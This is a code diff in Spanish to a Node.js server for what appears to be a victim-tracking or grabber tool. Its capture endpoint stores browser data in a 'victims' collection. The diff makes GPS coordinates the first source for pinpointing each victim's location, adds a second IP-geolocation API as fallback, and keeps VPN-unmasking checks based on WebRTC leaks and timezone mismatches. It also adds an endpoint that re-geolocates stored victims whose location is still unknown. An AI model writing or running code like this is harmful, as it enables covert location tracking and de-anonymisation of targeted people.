@@ -186,7 +186,39 @@ function parseUserAgent(ua) {
   return { browser, os };
 }
 
-// Obtener geolocalización precisa desde IP usando ipapi.co (CON CACHÉ)
+// Obtener geolocalización desde ip-api.com (sin límites para uso no comercial)
+async function getLocationFromIPAPI(ip) {
+    try {
+        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
+        if (!response.ok) throw new Error('ip-api.com request failed');
+
+        const data = await response.json();
+
+        if (data.status === 'fail') {
+            throw new Error(data.message || 'API error');
+        }
+
+        return {
+            ip: data.query || ip,
+            city: data.city || null,
+            country: data.countryCode || null,
+            country_name: data.country || null,
+            region: data.regionName || null,
+            timezone: data.timezone || null,
+            latitude: data.lat || null,
+            longitude: data.lon || null,
+            isp: data.isp || data.org || null,
+            postal: data.zip || null,
+            continent: null,
+            source: 'ip-api'
+        };
+    } catch (error) {
+        console.error('Error en ip-api.com:', error.message);
+        return null;
+    }
+}
+
+// Obtener geolocalización precisa desde IP usando ipapi.co con fallback a ip-api.com
 async function getLocationFromIP(ip) {
     // Si es localhost o IP interna, retornar datos por defecto
     if (ip === '::1' || ip === '127.0.0.1' || ip.startsWith('192.168') || ip.startsWith('10.')) {
@@ -210,49 +242,64 @@ async function getLocationFromIP(ip) {
         return { ...cached, fromCache: true };
     }
 
+    // Intentar con ipapi.co primero
     try {
         const response = await fetch(`https://ipapi.co/${ip}/json/`);
         if (!response.ok) throw new Error('API request failed');
 
         const data = await response.json();
 
-        // Verificar si la API retornó error
+        // Verificar si la API retornó error (rate limit, etc)
         if (data.error) {
             throw new Error(data.reason || 'API error');
         }
 
         const locationData = {
             ip: data.ip || ip,
-            city: data.city || 'Unknown',
-            country: data.country_code || 'Unknown',
-            country_name: data.country_name || 'Unknown',
-            region: data.region || 'Unknown',
-            timezone: data.timezone || 'Unknown',
+            city: data.city || null,
+            country: data.country_code || null,
+            country_name: data.country_name || null,
+            region: data.region || null,
+            timezone: data.timezone || null,
             latitude: data.latitude || null,
             longitude: data.longitude || null,
-            isp: data.org || 'Unknown',
-            postal: data.postal || 'Unknown',
-            continent: data.continent_code || 'Unknown',
+            isp: data.org || null,
+            postal: data.postal || null,
+            continent: data.continent_code || null,
             source: 'ipapi'
         };
 
-        // ✅ GUARDAR EN CACHÉ
-        setCachedLocation(ip, locationData);
-
-        return locationData;
+        // Solo guardar en caché si obtuvimos datos válidos
+        if (locationData.city || locationData.country) {
+            setCachedLocation(ip, locationData);
+            return locationData;
+        } else {
+            throw new Error('No location data returned');
+        }
     } catch (error) {
-        console.error('Error obteniendo geolocalización desde IP:', error);
-        // Fallback si falla la API
+        console.error('ipapi.co falló, intentando con ip-api.com:', error.message);
+
+        // ✅ FALLBACK a ip-api.com
+        const fallbackData = await getLocationFromIPAPI(ip);
+
+        if (fallbackData && (fallbackData.city || fallbackData.country)) {
+            // Guardar en caché el resultado del fallback
+            setCachedLocation(ip, fallbackData);
+            return fallbackData;
+        }
+
+        // Si ambas APIs fallaron, retornar datos mínimos
+        console.error('Ambas APIs de geolocalización fallaron para IP:', ip);
         return {
             ip: ip,
-            city: 'Unknown',
-            country: 'Unknown',
-            country_name: 'Unknown',
-            region: 'Unknown',
-            timezone: 'Unknown',
+            city: null,
+            country: null,
+            country_name: null,
+            region: null,
+            timezone: null,
             latitude: null,
             longitude: null,
-            isp: 'Unknown',
+            isp: null,
             source: 'failed'
         };
     }
@@ -409,9 +456,42 @@ app.post('/api/capture', async (req, res) => {
       });
     }
 
-    // Enriquecer con datos de geolocalización
-    // Primero intentar con IP
-    let geo = await getLocationFromIP(clientIP);
+    // ✅ PRIORIZAR GPS SOBRE IP PARA UBICACIÓN
+    let geo = null;
+    let locationSource = 'unknown';
+
+    // 1. Si hay GPS, usarlo primero (más preciso)
+    if (data.geolocation?.latitude && data.geolocation?.longitude) {
+      console.log(`🌍 GPS disponible, usando coordenadas: (${data.geolocation.latitude}, ${data.geolocation.longitude})`);
+
+      const gpsLocation = await getLocationFromCoordinates(
+        data.geolocation.latitude,
+        data.geolocation.longitude
+      );
+
+      if (gpsLocation && (gpsLocation.city || gpsLocation.country)) {
+        // Obtener IP info para ISP y timezone
+        const ipInfo = await getLocationFromIP(clientIP);
+
+        geo = {
+          ip: ipInfo.ip || clientIP,
+          isp: ipInfo.isp,
+          timezone: ipInfo.timezone,
+          ...gpsLocation, // Sobrescribir ubicación con datos GPS
+          source: 'gps' // Marcar que viene de GPS
+        };
+        locationSource = 'gps';
+        console.log(`✅ Ubicación obtenida desde GPS: ${geo.city}, ${geo.country}`);
+      } else {
+        console.log('⚠️ Reverse geocoding falló, usando IP como fallback');
+        geo = await getLocationFromIP(clientIP);
+        locationSource = geo.source || 'ip';
+      }
+    } else {
+      // 2. Si no hay GPS, usar IP
+      geo = await getLocationFromIP(clientIP);
+      locationSource = geo.source || 'ip';
+    }
 
     // ✅ DETECCIÓN DE VPN/PROXY MEJORADA
     const vpnDetection = {
@@ -423,7 +503,7 @@ app.post('/api/capture', async (req, res) => {
     };
 
     // 1. Verificar mismatch entre timezone del navegador y ubicación de IP
-    if (data.timezoneInfo?.timezone && geo.timezone && geo.timezone !== 'Unknown' && geo.timezone !== 'UTC') {
+    if (data.timezoneInfo?.timezone && geo?.timezone && geo.timezone !== 'UTC') {
       const browserTZ = data.timezoneInfo.timezone;
       const ipTZ = geo.timezone;
 
@@ -455,7 +535,7 @@ app.post('/api/capture', async (req, res) => {
       'hosting', 'cloudflare', 'akamai'
     ];
 
-    if (geo.isp && typeof geo.isp === 'string') {
+    if (geo?.isp && typeof geo.isp === 'string') {
       const ispLower = geo.isp.toLowerCase();
       if (vpnISPs.some(vpn => ispLower.includes(vpn))) {
         vpnDetection.suspiciousISP = true;
@@ -465,9 +545,6 @@ app.post('/api/capture', async (req, res) => {
     }
 
     // 4. Determinar si probablemente es VPN
-    // Alta confianza: WebRTC leak + timezone mismatch
-    // Media confianza: Uno de los dos anteriores
-    // Baja confianza: Solo ISP sospechoso
     if (vpnDetection.webRTCLeak && vpnDetection.timezoneMismatch) {
       vpnDetection.likelyVPN = true;
       vpnDetection.confidence = 'high';
@@ -479,48 +556,24 @@ app.post('/api/capture', async (req, res) => {
       vpnDetection.confidence = 'low';
     }
 
-    // Si la API de IP falló o retornó Unknown Y tenemos coordenadas GPS del usuario
-    if ((geo.source === 'failed' || geo.city === 'Unknown') &&
-        data.geolocation?.latitude &&
-        data.geolocation?.longitude) {
-
-      console.log(`🌍 Intentando reverse geocoding desde GPS (${data.geolocation.latitude}, ${data.geolocation.longitude})`);
-
-      const gpsLocation = await getLocationFromCoordinates(
-        data.geolocation.latitude,
-        data.geolocation.longitude
-      );
-
-      if (gpsLocation) {
-        // Usar datos del GPS en lugar de la IP
-        geo = {
-          ip: geo.ip, // Mantener IP
-          isp: geo.isp, // Mantener ISP si lo tenemos
-          timezone: geo.timezone, // Mantener timezone si lo tenemos
-          ...gpsLocation // Sobrescribir con datos del GPS
-        };
-        console.log(`✅ Ubicación obtenida desde GPS: ${geo.city}, ${geo.country}`);
-      }
-    }
-
     // Crear objeto network completo con todos los datos
     const networkData = {
-      ip: geo.ip,
-      country: geo.country,
-      country_name: geo.country_name,
-      city: geo.city,
-      region: geo.region,
-      timezone: geo.timezone,
-      latitude: geo.latitude,
-      longitude: geo.longitude,
-      isp: geo.isp,
-      postal: geo.postal || 'Unknown',
-      continent: geo.continent || 'Unknown',
+      ip: geo?.ip || clientIP,
+      country: geo?.country || 'Unknown',
+      country_name: geo?.country_name || 'Unknown',
+      city: geo?.city || 'Unknown',
+      region: geo?.region || 'Unknown',
+      timezone: geo?.timezone || 'Unknown',
+      latitude: geo?.latitude || null,
+      longitude: geo?.longitude || null,
+      isp: geo?.isp || 'Unknown',
+      postal: geo?.postal || 'Unknown',
+      continent: geo?.continent || 'Unknown',
       connectionType: data.network?.effectiveType || 'Unknown',
       downlink: data.network?.downlink || 'Unknown',
       rtt: data.network?.rtt || 'Unknown',
       saveData: data.network?.saveData || false,
-      locationSource: geo.source || 'unknown', // Indicar de dónde viene la ubicación
+      locationSource: locationSource, // Indicar de dónde viene la ubicación
       vpnDetection: vpnDetection // ✅ NUEVO: Detección de VPN/Proxy
     };
 
@@ -749,6 +802,131 @@ app.delete('/api/clear', async (req, res) => {
     res.status(500).json({
       success: false,
       error: 'Internal server error'
+    });
+  }
+});
+
+// ✅ RE-PROCESAR VÍCTIMAS CON UBICACIÓN UNKNOWN
+app.post('/api/reprocess-locations', async (req, res) => {
+  try {
+    console.log('🔄 Re-procesando ubicaciones Unknown...');
+
+    // Buscar víctimas con ubicación Unknown
+    const victimsWithUnknownLocation = await victimsCollection.find({
+      $or: [
+        { 'network.city': 'Unknown' },
+        { 'network.country': 'Unknown' },
+        { 'network.city': { $exists: false } },
+        { 'network.country': { $exists: false } }
+      ]
+    }).toArray();
+
+    console.log(`📊 Encontradas ${victimsWithUnknownLocation.length} víctimas con ubicación Unknown`);
+
+    let updated = 0;
+    let failed = 0;
+    let skipped = 0;
+
+    for (const victim of victimsWithUnknownLocation) {
+      try {
+        let newGeo = null;
+        let locationSource = 'unknown';
+
+        // 1. Intentar con GPS si está disponible
+        if (victim.geolocation?.latitude && victim.geolocation?.longitude) {
+          console.log(`🌍 Víctima ${victim._id}: Intentando GPS...`);
+
+          const gpsLocation = await getLocationFromCoordinates(
+            victim.geolocation.latitude,
+            victim.geolocation.longitude
+          );
+
+          if (gpsLocation && (gpsLocation.city || gpsLocation.country)) {
+            // Obtener IP info
+            const ipInfo = await getLocationFromIP(victim.network?.ip || '8.8.8.8');
+
+            newGeo = {
+              ip: victim.network?.ip || 'Unknown',
+              isp: ipInfo.isp,
+              timezone: ipInfo.timezone,
+              ...gpsLocation,
+              source: 'gps'
+            };
+            locationSource = 'gps';
+            console.log(`   ✅ GPS exitoso: ${newGeo.city}, ${newGeo.country}`);
+          }
+        }
+
+        // 2. Si GPS falló o no está disponible, intentar con IP
+        if (!newGeo && victim.network?.ip) {
+          console.log(`🌐 Víctima ${victim._id}: Intentando IP (${victim.network.ip})...`);
+
+          const ipLocation = await getLocationFromIP(victim.network.ip);
+
+          if (ipLocation && (ipLocation.city || ipLocation.country)) {
+            newGeo = ipLocation;
+            locationSource = ipLocation.source || 'ip';
+            console.log(`   ✅ IP exitosa: ${newGeo.city}, ${newGeo.country}`);
+          }
+        }
+
+        // 3. Actualizar si obtuvimos nuevos datos
+        if (newGeo && (newGeo.city || newGeo.country)) {
+          const updates = {
+            'network.city': newGeo.city || 'Unknown',
+            'network.country': newGeo.country || 'Unknown',
+            'network.country_name': newGeo.country_name || 'Unknown',
+            'network.region': newGeo.region || 'Unknown',
+            'network.latitude': newGeo.latitude || null,
+            'network.longitude': newGeo.longitude || null,
+            'network.timezone': newGeo.timezone || 'Unknown',
+            'network.isp': newGeo.isp || victim.network?.isp || 'Unknown',
+            'network.postal': newGeo.postal || 'Unknown',
+            'network.locationSource': locationSource
+          };
+
+          await victimsCollection.updateOne(
+            { _id: victim._id },
+            { $set: updates }
+          );
+
+          updated++;
+          console.log(`   📝 Actualizado: ${newGeo.city}, ${newGeo.country}`);
+        } else {
+          skipped++;
+          console.log(`   ⏭️ Sin datos disponibles, omitido`);
+        }
+
+        // Pequeña pausa para no saturar las APIs
+        await new Promise(resolve => setTimeout(resolve, 1000));
+
+      } catch (error) {
+        console.error(`   ❌ Error procesando víctima ${victim._id}:`, error.message);
+        failed++;
+      }
+    }
+
+    console.log(`✅ Re-procesamiento completado:`);
+    console.log(`   📊 Total: ${victimsWithUnknownLocation.length}`);
+    console.log(`   ✅ Actualizados: ${updated}`);
+    console.log(`   ⏭️ Omitidos: ${skipped}`);
+    console.log(`   ❌ Errores: ${failed}`);
+
+    res.json({
+      success: true,
+      message: 'Location reprocessing completed',
+      total: victimsWithUnknownLocation.length,
+      updated: updated,
+      skipped: skipped,
+      failed: failed
+    });
+
+  } catch (error) {
+    console.error('Error en /api/reprocess-locations:', error);
+    res.status(500).json({
+      success: false,
+      error: 'Reprocessing failed',
+      details: error.message
     });
   }
 });
